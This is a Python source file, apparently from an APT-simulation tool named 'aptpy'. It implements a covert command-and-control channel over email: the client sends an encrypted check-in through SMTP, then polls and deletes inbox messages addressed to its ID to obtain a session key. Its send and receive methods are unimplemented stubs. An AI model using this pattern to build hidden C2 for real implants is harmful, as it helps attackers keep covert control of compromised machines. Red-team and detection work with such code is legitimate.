import imaplib
import smtplib
from abstract import AbstractChannel
from base64 import b64decode, b64encode
from email.mime.text import MIMEText
from email import message_from_string
from json import dumps, loads
from lib.encrypt import RSAencrypt, RSAdecrypt, AESencrypt, AESdecrypt
from logging import getLogger


class MailChannel(AbstractChannel):
    def __init__(self, client_id, queue_send, queue_recv, debug=False, settings=None):
        super(MailChannel, self).__init__(client_id, queue_send, queue_recv, debug)

        if settings is None:
            settings = {}

        self.settings = settings
        self.connection_requested = False
        self.delimiter = "~~~~~~~~~~~~~~~~~~~~"

    def enabled(self):
        return True

    def connect(self):
        getLogger('aptpy').debug("[MAIL] Trying to contact the remote server")

        message = self._get_emails(2)

        if message:
            encrypted = message.pop().split(self.delimiter)
            plain = RSAdecrypt(encrypted[0], encrypted[1])

            if plain:
                self._key = loads(plain).pop()

        # Do we have a key? If so we can stop here
        if self._key:
            return

        # Send the "ping" email just once
        if not self.connection_requested:
            self.connection_requested = True
            data = dumps({'task': 'ping', 'client_id': self.client_id})
            encrypted = RSAencrypt(data)

            body = encrypted['data'] + "\n" + self.delimiter + "\n" + encrypted['sign'] + self.delimiter + "\n"
            subject = b64encode(self.client_id)

            self._send_email(body, subject)

    def _send(self):
        pass

    def receive(self):
        pass

    def _get_emails(self, parts):
        results = []
        mailer = imaplib.IMAP4_SSL(self.settings['imap']['host'])
        rv, data = mailer.login(self.settings['imap']['user'], self.settings['imap']['password'])

        mailer.select('INBOX')
        (retcode, messages) = mailer.search(None, '(ALL)')

        my_subject = 'R:' + b64encode(str(self.client_id))

        if retcode == 'OK':
            for num in messages[0].split():
                typ, data = mailer.fetch(num, '(RFC822)')
                original = message_from_string(data[0][1])

                # Skip messages that aren't for me
                if original['Subject'] != my_subject:
                    continue

                body = original.get_payload(decode=True)

                # Message with invalid body
                if body.count(self.delimiter) < 2 or body.count(self.delimiter) > 3:
                    continue

                if body.count(self.delimiter) == parts:
                    results.append(body)
                    typ, data = mailer.store(num, '+FLAGS', '\\Deleted')
                    break

        mailer.expunge()
        mailer.close()
        mailer.logout()

        return results

    def _send_email(self, body, subject):
        address = self.settings['address']
        host = self.settings['smtp']['host']
        port = self.settings['smtp']['port']
        user = self.settings['smtp']['user']
        password = self.settings['smtp']['password']

        mailer = smtplib.SMTP(host, str(port), timeout=10)
        mailer.ehlo()
        mailer.starttls()
        mailer.login(user=user, password=password)
        message = MIMEText(body)

        message['Subject'] = subject
        message['From'] = address
        message['To'] = address

        mailer.sendmail(address, [address], message.as_string())
        mailer.quit()
